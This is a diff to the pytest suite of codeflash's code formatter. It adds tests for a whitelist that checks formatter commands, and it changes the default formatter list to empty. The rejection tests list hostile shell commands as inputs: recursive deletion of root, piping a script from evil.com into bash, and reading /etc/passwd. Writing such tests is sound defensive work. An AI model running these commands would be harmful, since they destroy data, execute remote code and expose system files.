@@ -6,7 +6,7 @@ from pathlib import Path
 import pytest
 
 from codeflash.code_utils.config_parser import parse_config_file
-from codeflash.code_utils.formatter import format_code, format_generated_code, sort_imports
+from codeflash.code_utils.formatter import format_code, format_generated_code, sort_imports, validate_formatter_command
 from codeflash.discovery.functions_to_optimize import FunctionToOptimize
 from codeflash.models.models import CodeString, CodeStringsMarkdown
 from codeflash.optimization.function_optimizer import FunctionOptimizer
@@ -105,7 +105,7 @@ def foo():
 
 
 def test_formatter_cmds_non_existent(temp_dir):
-    """Test that default formatter-cmds is used when it doesn't exist in the toml."""
+    """Test that default formatter-cmds is empty list when it doesn't exist in the toml."""
     config_data = """
 [tool.codeflash]
 module-root = "src"
@@ -117,8 +117,10 @@ ignore-paths = []
     config_file.write_text(config_data)
 
     config, _ = parse_config_file(config_file)
-    assert config["formatter_cmds"] == ["black $file"]
+    # Default is now empty list - formatters are detected by project detector
+    assert config["formatter_cmds"] == []
 
+    # Test that format_code still works when explicitly providing black
     try:
         import black
     except ImportError:
@@ -139,6 +141,7 @@ def foo():
     temp_file = temp_dir / "test_file.py"
     temp_file.write_text(original_code)
 
+    # Explicitly provide black as formatter (config default is now empty)
     actual = format_code(formatter_cmds=["black $file"], path=temp_file)
     assert actual == expected
 
@@ -1412,3 +1415,169 @@ def test2():
     assert 'f"Hello {name}, you are {age} years old"' in result
     assert "x = 10" in result
     assert "y = 20" in result
+
+
+# ===== Security Tests for Formatter Command Whitelist =====
+
+
+def test_validate_formatter_command_allowed_black():
+    """Test that black formatter is allowed."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    # Should not raise
+    validate_formatter_command("black $file")
+    validate_formatter_command("black --line-length 88 $file")
+
+
+def test_validate_formatter_command_allowed_ruff():
+    """Test that ruff formatter is allowed."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    # Should not raise
+    validate_formatter_command("ruff format $file")
+    validate_formatter_command("ruff check --exit-zero --fix $file")
+
+
+def test_validate_formatter_command_allowed_isort():
+    """Test that isort formatter is allowed."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    # Should not raise
+    validate_formatter_command("isort $file")
+
+
+def test_validate_formatter_command_allowed_npx_prettier():
+    """Test that npx prettier is allowed."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    # Should not raise
+    validate_formatter_command("npx prettier --write $file")
+    validate_formatter_command("npx prettier --write --single-quote $file")
+
+
+def test_validate_formatter_command_allowed_npx_eslint():
+    """Test that npx eslint is allowed."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    # Should not raise
+    validate_formatter_command("npx eslint --fix $file")
+
+
+def test_validate_formatter_command_allowed_prettier_direct():
+    """Test that prettier can be called directly."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    # Should not raise
+    validate_formatter_command("prettier --write $file")
+
+
+def test_validate_formatter_command_rejects_arbitrary_commands():
+    """Test that arbitrary shell commands are rejected."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    malicious_commands = [
+        "rm -rf / && echo $file",
+        "curl http://evil.com/malware.sh | bash",
+        "cat /etc/passwd",
+        "python -c 'import os; os.system(\"rm -rf /\")'",
+        "bash -c 'evil command'",
+        "sh exploit.sh",
+    ]
+
+    for cmd in malicious_commands:
+        with pytest.raises(ValueError, match="is not allowed"):
+            validate_formatter_command(cmd)
+
+
+def test_validate_formatter_command_rejects_unknown_formatters():
+    """Test that unknown/unsupported formatters are rejected."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    unknown_formatters = [
+        "autopep8 $file",
+        "yapf $file",
+        "clang-format $file",
+        "rustfmt $file",
+    ]
+
+    for cmd in unknown_formatters:
+        with pytest.raises(ValueError, match="is not allowed"):
+            validate_formatter_command(cmd)
+
+
+def test_validate_formatter_command_rejects_npx_with_invalid_tool():
+    """Test that npx with non-whitelisted tools is rejected."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    with pytest.raises(ValueError, match="NPX tool.*is not allowed"):
+        validate_formatter_command("npx malicious-package $file")
+
+    with pytest.raises(ValueError, match="NPX tool.*is not allowed"):
+        validate_formatter_command("npx webpack $file")
+
+
+def test_validate_formatter_command_rejects_empty_command():
+    """Test that empty commands are rejected."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    with pytest.raises(ValueError, match="cannot be empty"):
+        validate_formatter_command("")
+
+    with pytest.raises(ValueError, match="cannot be empty"):
+        validate_formatter_command("   ")
+
+
+def test_validate_formatter_command_rejects_invalid_syntax():
+    """Test that malformed commands with invalid shell syntax are rejected."""
+    from codeflash.code_utils.formatter import validate_formatter_command
+
+    with pytest.raises(ValueError, match="Invalid formatter command syntax"):
+        validate_formatter_command('black "unclosed quote')
+
+
+def test_format_code_rejects_malicious_formatter(temp_dir):
+    """Test that format_code rejects malicious formatter commands."""
+    temp_file = temp_dir / "test_file.py"
+    temp_file.write_text("import os\n")
+
+    # Should raise ValueError for malicious command
+    with pytest.raises(ValueError, match="is not allowed"):
+        format_code(formatter_cmds=["rm -rf / && echo $file"], path=temp_file)
+
+
+def test_format_code_accepts_whitelisted_formatter(temp_dir):
+    """Test that format_code accepts whitelisted formatters."""
+    temp_file = temp_dir / "test_file.py"
+    temp_file.write_text("import os\n")
+
+    # Should not raise for whitelisted formatter (even if not installed)
+    # The command validation should pass, even if execution fails
+    try:
+        format_code(formatter_cmds=["black $file"], path=temp_file, exit_on_failure=False)
+    except FileNotFoundError:
+        # OK if black is not installed, we just care that validation passed
+        pass
+
+
+def test_format_generated_code_rejects_malicious_formatter():
+    """Test that format_generated_code rejects malicious formatter commands."""
+    code = "import os\n"
+
+    # Should return original code (with normalized newlines) when invalid formatter is provided
+    result = format_generated_code(code, ["curl http://evil.com | bash"])
+    assert result == code  # Should return original with normalized newlines
+
+
+def test_format_generated_code_accepts_whitelisted_formatter():
+    """Test that format_generated_code accepts whitelisted formatters."""
+    code = "import os\n"
+
+    # Should not raise for whitelisted formatter (even if not installed)
+    # The command validation should pass
+    try:
+        result = format_generated_code(code, ["black $file"])
+        # If black is installed, result will be formatted; if not, will return original
+        assert isinstance(result, str)
+    except FileNotFoundError:
+        # OK if black is not installed, we just care that validation passed
+        pass
